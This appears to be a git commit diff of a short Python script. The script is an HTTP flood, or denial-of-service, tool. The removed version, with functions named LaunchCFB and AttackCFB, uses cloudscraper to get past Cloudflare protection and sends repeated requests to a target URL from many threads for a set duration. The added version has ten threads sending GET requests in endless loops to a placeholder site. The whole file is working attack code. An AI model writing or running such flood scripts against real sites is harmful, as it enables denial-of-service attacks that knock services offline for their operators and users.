51591d46e9702b5b39707649e67e4c7fb191097f
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-07-17 15:10:12 +0600

    Update main.py

--- main.py
+++ main.py
@@ -1,27 +1,22 @@
-import datetime
 import threading
-import cloudscraper
+import requests
 
-def LaunchCFB(url, th, t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    scraper = cloudscraper.create_scraper()
-    for _ in range(int(th)):
+def send_request(url):
+    while True:
         try:
-            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
-            thd.start()
-        except:
-            pass
+            response = requests.get(url)
+            print(f"Status code: {response.status_code}")
+        except Exception as e:
+            print(f"Error: {e}")
 
-def AttackCFB(url, until_datetime, scraper):
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
-            scraper.get(url, timeout=15)
-            scraper.get(url, timeout=15)
-        except:
-            pass
+if __name__ == "__main__":
+    url = "https://www.yourwebsite.com"
+    num_threads = 10
+    threads = []
+    for i in range(num_threads):
+        thread = threading.Thread(target=send_request, args=(url,))
+        thread.start()
+        threads.append(thread)
 
-if __name__ == '__main__':
-    url = 'https://www.example.com'
-    th = 10
-    t = 60
-    LaunchCFB(url, th, t)
+    for thread in threads:
+        thread.join()
